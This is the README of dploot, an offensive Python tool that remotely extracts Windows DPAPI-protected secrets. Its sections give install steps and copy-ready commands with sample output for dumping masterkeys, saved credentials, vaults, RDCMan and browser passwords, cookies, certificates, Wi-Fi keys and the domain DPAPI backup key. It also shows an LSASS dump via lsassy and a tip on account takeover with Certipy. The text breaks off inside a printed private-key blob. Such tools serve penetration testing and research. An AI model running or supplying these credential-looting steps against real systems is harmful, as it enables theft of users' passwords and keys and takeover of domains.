# dploot

dploot is Python rewrite of [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) written un C# by [Harmj0y](https://twitter.com/harmj0y), which is itself a port of DPAPI from [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi). It implements all the DPAPI logic of these tools, but this time it is usable with a python interpreter and from a Linux environment.

If you don't know what is DPAPI, [check out this post](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107).

## Table of Contents

- [dploot](#dploot)
  - [Table of Contents](#table-of-contents)
  - [Installation](#installation)
  - [Usage](#usage)
    - [Kerberos](#kerberos)
  - [How to use](#how-to-use)
    - [As a local administrator on the machine](#as-a-local-administrator-on-the-machine)
    - [As a domain administrator (or equivalent)](#as-a-domain-administrator-or-equivalent)
    - [Not as a domain administrator](#not-as-a-domain-administrator)
  - [Commands](#commands)
    - [User Triage](#user-triage)
      - [masterkeys](#masterkeys)
      - [credentials](#credentials)
      - [vaults](#vaults)
      - [rdg](#rdg)
      - [certificates](#certificates)
      - [browser](#browser)
      - [triage](#triage)
    - [Machine Triage](#machine-triage)
      - [machinemasterkeys](#machinemasterkeys)
      - [machinecredentials](#machinecredentials)
      - [machinevaults](#machinevaults)
      - [machinecertificates](#machinecertificates)
      - [machinetriage](#machinetriage)
    - [Misc](#misc)
      - [wifi](#wifi)
      - [backupkey](#backupkey)
  - [Credits](#credits)
  - [TODO](#TODO)

## Installation

You can install dploot directly from PyPI:

```text
pip install dploot
```

OR

```text
git clone https://github.com/zblurx/dploot.git
cd dploot
make
```

## Usage

```text
usage: dploot [-h] [-debug] [-quiet] {certificates,credentials,masterkeys,vaults,backupkey,rdg,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi} ...

DPAPI looting remotely in Python

positional arguments:
  {certificates,credentials,masterkeys,vaults,backupkey,rdg,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi}
                        Action
    certificates        Dump users certificates from remote target
    credentials         Dump users Credential Manager blob from remote target
    masterkeys          Dump users masterkey from remote target
    vaults              Dump users Vaults blob from remote target
    backupkey           Backup Keys from domain controller
    rdg                 Dump users saved password information for RDCMan.settings from remote target
    triage              Loot Masterkeys (if not set), credentials, rdg, certificates, browser and vaults from remote target
    machinemasterkeys   Dump system masterkey from remote target
    machinecredentials  Dump system credentials from remote target
    machinevaults       Dump system vaults from remote target
    machinecertificates
                        Dump system certificates from remote target
    machinetriage       Loot SYSTEM Masterkeys (if not set), SYSTEM credentials, SYSTEM certificates and SYSTEM vaults from remote target
    browser             Dump users credentials and cookies saved in browser from remote target
    wifi                Dump wifi profiles from remote target

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -quiet                Only output dumped credentials
```

### Kerberos

dploot can authenticate with Kerberos. Simply use `-k` option. If you want to use a cached ticket, use `-use-kcache` option. 

## How to use

The goal of dploot is to simplify DPAPI related loot from a Linux box. As SharpDPAPI, how you use this tool will depend on if you compromised the domain or not.

### As a local administrator on the machine

Whenever you are local administrator of a windows computer, you can loot machine secrets, for example with [machinecertificates](#machinecertificates) (or any other [Machine Triage](#machine-triage) commands, or [wifi](#wifi) command):

```text
$ dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -quiet
[-] Writting certificate to DESKTOP-OJ3N8TJ.waza.local_796449B12B788ABA.pfx
```

### As a domain administrator (or equivalent)

If you have domain admin privileges, you can obtain the domain DPAPI backup key with the backupkey command. This key can decrypt any DPAPI masterkeys for domain users and computers, and it will never change. Therefore, this key allow attacker to loot any DPAPI protected password realted to a domain user.

To obtain the domain backupkey, you can use [backupkey](#backupkey) command:
```text
$ dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.56.112 -quiet
[-] Exporting domain backupkey to file key.pvk
```

Then you can loot any user secrets stored on a windows domain-joined computer on the network, for example with [certificates](#certificates) command (or any other [User Triage](#user-triage) commands):
```
$ dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -pvk key.pvk  -quiet
[-] Writting certificate to jsmith_waza.local_C0F800ECBA7BE997.pfx
[-] Writting certificate to jsmith_waza.local_D0C73E2C04BEAAB0.pfx
[-] Writting certificate to m.scott_waza.local_EB9C21A5642D4EBD.pfx
```

### Not as a domain administrator

If domain admin privileges have not been obtained (yet), using Mimikatz' sekurlsa::dpapi command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running dpapi::cache after key extraction will give you a nice table). If you change these keys to a {GUID1}:SHA1 {GUID2}:SHA1... type format, they can be supplied to dploot to triage the box. Use can also use [lsassy](https://github.com/Hackndo/lsassy) to harvest decrypted masterkeys:

```text
$ lsassy -u Administrator -p 'Password!123' -d waza.local 192.168.56.14 -m rdrleakdiag -M masterkeys
[+] 192.168.56.14 Authentication successful
[+] 192.168.56.14 Lsass dumped in C:\Windows\Temp\ff32F.fon (57121318 Bytes)
[+] 192.168.56.14 Lsass dump deleted
[+] 192.168.56.14 WAZA\DESKTOP-OJ3N8TJ$        [NT] 0e43c22a4b09520cf79ca19a9e1bbec7 | [SHA1] 2ce587ab64aa3488c5ed412ca1e554d0f8e5a411
(snip)
[+] 192.168.56.14 5 masterkeys saved to /data/masterkeys
```

Then you can use this masterkey file to loot the targeted computer, for example with [browser](#browser) command (or any other [User Triage](#user-triage) commands):

```text
$ dploot browser -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -mkfile /data/masterkeys
[*] Connected to 192.168.56.14 as waza.local\Administrator (admin)

[*] Triage Browser Credentials for ALL USERS

[MSEDGE LOGIN DATA]
URL:		
Username:	zblurx@gmail.com
Password:	Waza1234
```

## Commands

### User Triage

#### masterkeys

The **masterkeys** command will get any user masterkey file and decrypt them with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` domain backup key. It will return a set of masterkey {GUID}:SHA1 mappings. Note that it will try to use password or nthash that you used to connect to the target even if you don't specify corresponding options.

*With domain backupkey*:

```text
$ dploot masterkeys -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
{68e05bd7-9de9-46f0-95e3-b5036baa49e9}:2d87a923d05534da67d449cbad9a7390d019910a
```

*With password*:

```text
$ cat passwords
jsmith:Password#123
$ dploot masterkeys -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -passwords passwords
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
{68e05bd7-9de9-46f0-95e3-b5036baa49e9}:2d87a923d05534da67d449cbad9a7390d019910a
```

***Tips***: *With the `outputfile` flag, dploot masterkeys will append looted masterkeys in a specified file. It is not a problem to store every masterkeys in the same file, because a DPAPI BLOB store the GUID of the masterkey that will be needed in order to decrypt it.*

#### credentials

The **credentials** command will search for users Credential files and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot credentials -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage Credentials for ALL USERS

[CREDENTIAL]
LastWritten : 2022-04-12 16:55:44
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=test
Description :
Unknown     :
Username    : test
Unknown     : Password#{123}

[CREDENTIAL]
LastWritten : 2022-04-27 19:23:02
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=TERMSRV/srv01.waza.local
Description :
Unknown     :
Username    : DESKTOP-I60R2L6\Administrator
Unknown     : Password!123
```

With `pvk`:

```text
$ dploot credentials -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
{68e05bd7-9de9-46f0-95e3-b5036baa49e9}:2d87a923d05534da67d449cbad9a7390d019910a

[*] Triage Credentials for ALL USERS

[CREDENTIAL]
LastWritten : 2022-05-19 10:25:06
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=myserver.com
Description :
Unknown     :
Username    : Administrator
Unknown     : Naga2019*
```

#### vaults

The **vaults** command will search for users Vaults secrets and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot vaults -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -mkfile waza.local.mkf
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage Vaults for ALL USERS

[VAULT_VPOL_KEYS]
Key1: 0x552f5d5b454d3a53aec4ff458539de02
Key2: 0x5565757b5acd988e1a7377030fbe7098bff3e98050ae9bca458fe554b9e2586b

[Internet Explorer]
Username        : test
Resource        : http://testphp.vulnweb.com/
Password        : b'74006500730074000000'

Decoded Password: test
```

With `pvk`:

```text
$ dploot vaults -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -pvk key.pvk
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22

[*] Triage Vaults for ALL USERS

[VAULT_VPOL_KEYS]
Key1: 0x552f5d5b454d3a53aec4ff458539de02
Key2: 0x5565757b5acd988e1a7377030fbe7098bff3e98050ae9bca458fe554b9e2586b

[Internet Explorer]
Username        : test
Resource        : http://testphp.vulnweb.com/
Password        : b'74006500730074000000'

Decoded Password: test
```

#### rdg

The **rdg** command will search for users RDCMan.settings files secrets and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot rdg -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -mkfile waza.local.mkf
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage RDCMAN Settings and RDG files for ALL USERS

[CREDENTIAL PROFILES]
	Profile Name:	WAZA\Administrator
	Username:	WAZA\Administrator
	Password:	Placeholder1234567890

[LOGON PROFILES]
	Profile Name:	Custom
	Username:	WAZA\Administrator
	Password:	Password!123

[SERVER PROFILES]
	Name:		DC01.waza.local
	Profile Name:	Custom
	Username:	WAZA\jdoe
	Password:	Password#123

[SERVER PROFILES]
	Name:		SRV01.waza.local
	Profile Name:	Custom
	Username:	WAZA\jfile
	Password:	Password#123
```

With `pvk`:

```text
dploot rdg -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -pvk key.pvk
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
{68e05bd7-9de9-46f0-95e3-b5036baa49e9}:2d87a923d05534da67d449cbad9a7390d019910a

[*] Triage RDCMAN Settings and RDG files for ALL USERS

[CREDENTIAL PROFILES]
	Profile Name:	WAZA\Administrator
	Username:	WAZA\Administrator
	Password:	Placeholder1234567890

[LOGON PROFILES]
	Profile Name:	Custom
	Username:	WAZA\Administrator
	Password:	Password!123

[SERVER PROFILES]
	Name:		DC01.waza.local
	Profile Name:	Custom
	Username:	WAZA\jdoe
	Password:	Password#123

[SERVER PROFILES]
	Name:		SRV01.waza.local
	Profile Name:	Custom
	Username:	WAZA\jfile
	Password:	Password#123
```

#### certificates

The **certificates** command will search for users certificates from *MY* and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage Certificates for ALL USERS

Issuer:			CN=waza-ADCS1-CA,DC=waza,DC=local
Subject:		CN=John Smith,CN=Users,DC=waza,DC=local
Valid Date:		2022-05-24 09:51:33
Expiry Date:		2023-05-24 09:51:33
Extended Key Usage:
	Unknown OID (1.3.6.1.4.1.311.10.3.4)
	emailProtection (1.3.6.1.5.5.7.3.4)
	clientAuth (1.3.6.1.5.5.7.3.2)
	[!] Certificate is used for client auth!

-----BEGIN CERTIFICATE-----
MIIGDTCCBPWgAwIBAgITewAAAAJ+dBN7rSmWMAAAAAAAAjANBgkqhkiG9w0BAQ0F
ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgR3YXph
MRYwFAYDVQQDEw13YXphLUFEQ1MxLUNBMB4XDTIyMDUyNDA5NTEzM1oXDTIzMDUy
(snip)
c/8HYJOcP6FjLmevTLLESCRCg9LG4I6NzjoRGU968HWZ5U7DGUYsCVUbzcIyJL3H
DfaOwrwiSOoINEPSRHXEn2L7gjX111h1SqKCdLQ8s9mhR1F063lZzbEfGBNG7di0
/j2bsWqbT/fCx+AgCT65VRk=
-----END CERTIFICATE-----


[-] Writting certificate to jsmith_waza.local_C0F800ECBA7BE997.pfx
```

With `pvk`:

```text
$ dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
{68e05bd7-9de9-46f0-95e3-b5036baa49e9}:2d87a923d05534da67d449cbad9a7390d019910a

[*] Triage Certificates for ALL USERS

Issuer:			CN=waza-ADCS1-CA,DC=waza,DC=local
Subject:		CN=John Smith,CN=Users,DC=waza,DC=local
Valid Date:		2022-05-24 09:51:33
Expiry Date:		2023-05-24 09:51:33
Extended Key Usage:
	Unknown OID (1.3.6.1.4.1.311.10.3.4)
	emailProtection (1.3.6.1.5.5.7.3.4)
	clientAuth (1.3.6.1.5.5.7.3.2)
	[!] Certificate is used for client auth!

-----BEGIN CERTIFICATE-----
MIIGDTCCBPWgAwIBAgITewAAAAJ+dBN7rSmWMAAAAAAAAjANBgkqhkiG9w0BAQ0F
ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgR3YXph
MRYwFAYDVQQDEw13YXphLUFEQ1MxLUNBMB4XDTIyMDUyNDA5NTEzM1oXDTIzMDUy
(snip)
c/8HYJOcP6FjLmevTLLESCRCg9LG4I6NzjoRGU968HWZ5U7DGUYsCVUbzcIyJL3H
DfaOwrwiSOoINEPSRHXEn2L7gjX111h1SqKCdLQ8s9mhR1F063lZzbEfGBNG7di0
/j2bsWqbT/fCx+AgCT65VRk=
-----END CERTIFICATE-----


[-] Writting certificate to jsmith_waza.local_C0F800ECBA7BE997.pfx
```

By default, the tool will loot only certificates used for client auth, but with `-dump-all` you can harvest all of them.

***Tips***: *If you get a certificate with client authentication EKU, you can takeover the account with [certipy](https://github.com/ly4k/Certipy).*

#### browser

The **browser** command will search for users password and cookies in chrome based browsers, and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot browser -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage Browser Credentials for ALL USERS

[MSEDGE LOGIN DATA]
URL:		
Username:	admin
Password:	Password!123
```

With `pvk`:

```text
$ dploot browser -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
{68e05bd7-9de9-46f0-95e3-b5036baa49e9}:2d87a923d05534da67d449cbad9a7390d019910a

[*] Triage Browser Credentials for ALL USERS

[MSEDGE LOGIN DATA]
URL:		
Username:	admin
Password:	Password!123
```

To display stored cookies, use `-show-cookies` option

#### triage

The **triage** command runs the user [credentials](#credentials), [vaults](#vaults), [rdg](#rdg), and [certificates](#certificates) commands.

### Machine Triage

#### machinemasterkeys

The **machinemasterkeys** command will dump LSA secrets with RemoteRegistry to retrieve DPAPI_SYSTEM key which will the be used to decrypt any found machine masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.

```text
$ dploot machinemasterkeys -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{b5ebf413-65bd-4ee7-aa49-2a3110f678d2}:ad7475c1efdf3e834037bead151e30beaefeb349
{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46
{e1a73282-709b-4717-ace0-00eecb280fcc}:cdb4c86722b50cecf87cf683c6d727f36d760dba
{6fbe7c89-9810-4ce3-b841-f0f1dd8b46e6}:1fb57eb358ea26c617d39ce04c5feb613ab10b89
{750630e8-b603-4d43-941e-6f756073e511}:f9fd650d02a09e92069c54465455feeea12f0049
{9a4057a3-06f2-4e4f-9a88-79ea3c3cadfa}:5b966689d74393684a221752950b46fb5236b3db
```

#### machinecredentials

The **machinecredentials** command will get any machine Credentials file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI XXX blob.

```text
$ dploot machinecredentials -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{07e6e8d6-7eae-4780-9aac-641818ddd9bb}:ddb9fa17d4e9ab12[...]
{a87bcad8-5ed9-4f09-a9f7-34d77e20d0d4}:e4661cd36f07bb1f[...]
{d03a0e3b-b616-4a29-8795-9ca09960de35}:a45fdd01699bfbc5[...]
{69b3f620-eca1-45c1-a003-f1d0a8598c57}:2862216b21e96fa6[...]
{9a270191-3f43-46d1-9935-5892dca2a9a2}:d3cb43dd6645d26d[...]
{e85c4ab7-65d3-45df-9abe-829c2ead1c5f}:c2a118094fb7cf85[...]

[*] Triage SYSTEM Credentials

[CREDENTIAL]
LastWritten : 2022-05-06 15:51:53
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:batch=TaskScheduler:Task:{31424469-6CCD-4137-8DFF-541872FD3CBB}
Description :
Unknown     :
Username    : WAZA\Administrator
Unknown     : Password!123
```

#### machinevaults

The **machinevaults** command will get any machine Vaults file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI Vaults blob.

```text
$ dploot machinevaults -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -debug
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage SYSTEM masterkeys

{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46
{e1a73282-709b-4717-ace0-00eecb280fcc}:cdb4c86722b50cecf87cf683c6d727f36d760dba
{6fbe7c89-9810-4ce3-b841-f0f1dd8b46e6}:1fb57eb358ea26c617d39ce04c5feb613ab10b89
{750630e8-b603-4d43-941e-6f756073e511}:f9fd650d02a09e92069c54465455feeea12f0049

[*] Triage SYSTEM Vaults

[VAULT_VPOL_KEYS]
Key1: 0x8a3dad10ce6ae44ba1700d1060cc28c4
Key2: 0x1514dd2c8f278ac517cf1ae09255aeaff62219a019bc21ac35321c040064b0b5
```

### machinecertificates

The **machinecertificates** command will get any machine private key file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot willdump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.

It will also dump machine CAPI certificates blob with RemoteRegistry.

```text
$ dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{b5ebf413-65bd-4ee7-aa49-2a3110f678d2}:ad7475c1efdf3e834037bead151e30beaefeb349
{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46
{e1a73282-709b-4717-ace0-00eecb280fcc}:cdb4c86722b50cecf87cf683c6d727f36d760dba
{6fbe7c89-9810-4ce3-b841-f0f1dd8b46e6}:1fb57eb358ea26c617d39ce04c5feb613ab10b89
{750630e8-b603-4d43-941e-6f756073e511}:f9fd650d02a09e92069c54465455feeea12f0049
{9a4057a3-06f2-4e4f-9a88-79ea3c3cadfa}:5b966689d74393684a221752950b46fb5236b3db

[*] Triage SYSTEM Certificates

Issuer:			CN=waza-ADCS1-CA,DC=waza,DC=local
Subject:		CN=DESKTOP-OJ3N8TJ.waza.local
Valid Date:		2022-06-11 10:31:16
Expiry Date:		2023-06-11 10:31:16
Extended Key Usage:
	clientAuth (1.3.6.1.5.5.7.3.2)
	serverAuth (1.3.6.1.5.5.7.3.1)
	[!] Certificate is used for client auth!

-----BEGIN CERTIFICATE-----
MIIFjTCCBHWgAwIBAgITewAAAAXrqLLiBZJG3AAAAAAABTANBgkqhkiG9w0BAQ0F
ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgR3YXph
(snip)
nXZ6/pA+XGqQwHG/hWG2TR5Ivjzoy+OjAgu44LqucC8Pw3wWToVWCKxdGgZcXqHE
TXrQnLFK+nWqjrvJsM/O6HgNJbG/lqF/sogux3FLmW7a
-----END CERTIFICATE-----


[-] Writting certificate to DESKTOP-OJ3N8TJ.waza.local_796449B12B788ABA.pfx
```

***Tips***: *If you get a certificate with client authentication EKU, you can takeover the account with [certipy](https://github.com/ly4k/Certipy).*

#### machinetriage

The machinetriage command runs the [machinecredentials](#machinecredentials), [machinevaults](#machinevaults) and [machinecertificates](#machinecertificates).

### Misc

#### wifi

The **wifi** command will get any wifi xml configuration file file and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot willdump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.

```text
$ dploot wifi -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{b5ebf413-65bd-4ee7-aa49-2a3110f678d2}:ad7475c1efdf3e834037bead151e30beaefeb349
{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46
{e1a73282-709b-4717-ace0-00eecb280fcc}:cdb4c86722b50cecf87cf683c6d727f36d760dba
{6fbe7c89-9810-4ce3-b841-f0f1dd8b46e6}:1fb57eb358ea26c617d39ce04c5feb613ab10b89
{750630e8-b603-4d43-941e-6f756073e511}:f9fd650d02a09e92069c54465455feeea12f0049
{9a4057a3-06f2-4e4f-9a88-79ea3c3cadfa}:5b966689d74393684a221752950b46fb5236b3db

[*] Triage ALL WIFI profiles

[WIFI]
SSID:		Wifi_G
AuthType:	WPA2PSK
Encryption:	AES
Preshared key:	AzErTy1234567890QwSxDcFvG

[WIFI]
SSID:		EAP_TLS
AuthType:	WPA2 EAP
Encryption:	AES
EAP Type:	EAP TLS

EapHostConfig:
  EapMethod:
    Type: 13
    VendorId: 0
    VendorType: 0
    AuthorId: 0
  Config:
    Eap:
      Type: 13
      EapType:
        CredentialsSource:
          CertificateStore:
            SimpleCertSelection: true
        ServerValidation:
          DisableUserPromptForServerValidation: false
          ServerNames: None
        DifferentUsername: false
        PerformServerValidation: true
        AcceptServerName: false

[snip]
```

#### backupkey

The **backupkey** command will retrieve the domaain DPAPI backup key from a domain controller using [MS-LDAD](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc). This key never changes and can decrypt any domain user DPAPI protected secret. Domain Admin privileges are required.

By default, this command will write the domain backup key into a file called key.pvk, but you can change this with `outputfile` flag. It is also possible to dump legacy backup key with `legacy` flag.

```text
$ dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.57.20
[*] Connected to dc01.waza.local as waza.local\e.cartman (admin)

[DOMAIN BACKUPKEY V2]

PVK_FILE_HDR
dwMagic: {2964713758}
dwVersion: {0}
dwKeySpec: {1}
dwEncryptType: {0}
cbEncryptData: {0}
cbPvk: {1172}
PRIVATEKEYBLOB:{1ef1b5b000000000010000000000000000000000940400000702000000a4000052534132000800000100010081a511b5e41ad9563aff9f591ba61bec76ba09859750b0bcbeff2ef26f06b1a85b6b763623249890587cee80495ad02c3c1554abf9eb472da753531186d1a58dc853ac85a31dc14348a477b1555e8f882a3c4543098896fe7523dabbfed2bda09a9cf86fdc017bb86375eec8058953193a58f8896c0c6f622da40cfee5f4734b07458176c3aa8ff1cbe3eaf6faa97d774c68f82b59a635d2e671d5e658bab75f7e6ca2d9c04bb5bf2aa18b13cb4b18951be73f0ec16e3e5d8e8caee9ab26d44e365b3669ccb03c1f2d25f24f6a7f2ac116975a9b58662c1aed40af1d0277b78dab978de25f7aaf09596b869fa5b7762c7f63b5ad0b8611826f79e37a252123f06f4cd136b5919607c768ebe59e1001952ae9bb74bb4462ffb5059473b836d8ca287bc0c01653d28da74798be1c867d364158d8fc3acbe287efe88ea24359b7cffa5b02fd61840a6b786ba33cf842e80231ded169eeb6bc582cb174a17f4dfdf25e7fdcd399f6dab6b62e91cdebaa882797b449bd591a5e189bc86ffc535771f60f05b0e4136d6e64c33adbd572e0c83b7762b0b5e81f36a9bc41c0445c652ddd4012d92839806a594af1b2abf392cbe052f585a69565d8ef23df0df41fdafbaa587cdda27c7a818590d48b75672c6459dc7a865fb69eaa0243c988d6a512bf2c6e24ddfdd1025a588a128cf981f2ed9370781b0f1a0c6ff1f4cccf22163073f9457f91d7fa2bd412bd8ce8d595ed1df2ea2ca1b9f02f0edba7a07ffddb81a6f2847a54ba0b1b8a6f78df0f5f2b29a347ce9b7b6f59e50c3828bfdefbba442f171c4c334c85ab7db48c6e4fd9acbd7d97e2ef59c56ad171b152c600977f6a19d8548ce931035995b5a3f6f70e2a4ac39ab071e39f8235ec3f238ac0017f71cbc4f52891d47ebb5114be9417a8d6a811a5c07025aa223fc6ac3dee729762ff1b34dab65cdce2a69887122d86054a03224fe9e982ad1071840ecdd18ebe3fc3eafa242d4a7bb917282fc2f157c6a9acef01871f70887e31e5b272fd20f39cf0256d96dde7f5380afca01917e57d04d11efa2e39051ca87ab61fd13e07555c8ab1137a8d916202ccd99b70c8ed080188fbf6691d621309441ac407865f985e44c5a2876a33f72a2bdef444b65d087eb150d8e83e9dc2eac198f0f3b9da26a32f2ba4d6b448ab4437778b74ecff7e94aae1020b2773469f80021ec4baaa202d859a21da601f3eff77b599f2249cc2e92019b97defbd2786599a9c331032db72356daec1236f703a6649aa5bc3eeef57177d9bb08d00844a573eb8fc356a36ffda43b2d790836a00fe632b124f280925bc13f1e60326ef0da237f2aaae721c0ffec02b84d09fe9f59d6aa68d19c61c9a794a0746ebe0d03af7563efa7ffef80462d10e30d65f2a9a75f44eba7b5222cffc49f331dc9f74bca51819e2b061ac558cc397bbf42e94ccb39625a584deb549eaf34dcfc2ecd9c9c0b0c2f65d4b6966d9e60a7a1c17c1848e7c7d7d4cd0054